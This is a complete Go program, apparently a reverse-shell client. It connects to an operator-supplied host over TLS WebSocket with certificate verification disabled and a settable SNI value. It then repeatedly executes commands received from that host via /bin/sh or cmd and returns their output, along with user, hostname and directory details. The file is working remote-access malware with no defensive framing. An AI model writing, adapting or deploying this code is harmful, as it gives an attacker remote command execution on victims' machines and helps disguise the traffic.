package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"

	"github.com/gorilla/websocket"
)

func main() {
	var targetIP string
	var targetPort string
	var sniValue string

	if len(os.Args) != 4 {
		fmt.Println("Usage: ./client <target_ip> <target_port> <sni_value>")
		os.Exit(1)
	}

	targetIP = os.Args[1]
	targetPort = os.Args[2]
	sniValue = os.Args[3]

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         sniValue,
	}

	dialer := websocket.Dialer{
		TLSClientConfig: tlsConfig,
	}

	url := fmt.Sprintf("wss://%s:%s/ws", targetIP, targetPort)
	conn, _, err := dialer.Dial(url, nil)
	if err != nil {
		log.Fatal("Error connecting to WebSocket server:", err)
	}
	defer conn.Close()

	// Get initial working directory and hostname for prompt
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // for Windows
	}

	for {
		// Get current working directory for prompt
		cwd, _ := os.Getwd()

		// Send initial prompt to server
		prompt := fmt.Sprintf("\n%s@%s:%s $ ", username, hostname, cwd)
		err := conn.WriteMessage(websocket.TextMessage, []byte(prompt))
		if err != nil {
			log.Println("Error sending prompt:", err)
			break
		}

		// Read command from server
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Println("Error reading command:", err)
			break
		}

		command := string(message)
		if command == "" {
			continue
		}

		// Prepare command execution based on shell type
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/c", command)
		} else {
			cmd = exec.Command("/bin/sh", "-c", command)
		}

		// Set the working directory for the command
		cmd.Dir = cwd

		// Execute with full pipe handling
		output, err := executeCommand(cmd)
		if err != nil {
			output = []byte(fmt.Sprintf("Error executing command: %s\n%s", err, output))
		}

		// Send output back to server
		if len(output) == 0 {
			output = []byte("\n")
		}
		err = conn.WriteMessage(websocket.TextMessage, output)
		if err != nil {
			log.Println("Error sending output:", err)
			break
		}
	}
}

func executeCommand(cmd *exec.Cmd) ([]byte, error) {
	// Create pipes for both stdout and stderr
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, err
	}

	// Start the command
	if err := cmd.Start(); err != nil {
		return nil, err
	}

	// Read both outputs
	stdoutBytes, err := io.ReadAll(stdout)
	if err != nil {
		return nil, err
	}
	stderrBytes, err := io.ReadAll(stderr)
	if err != nil {
		return nil, err
	}

	// Wait for command to complete
	if err := cmd.Wait(); err != nil {
		return append(stdoutBytes, stderrBytes...), err
	}

	// Combine stdout and stderr
	return append(stdoutBytes, stderrBytes...), nil
}
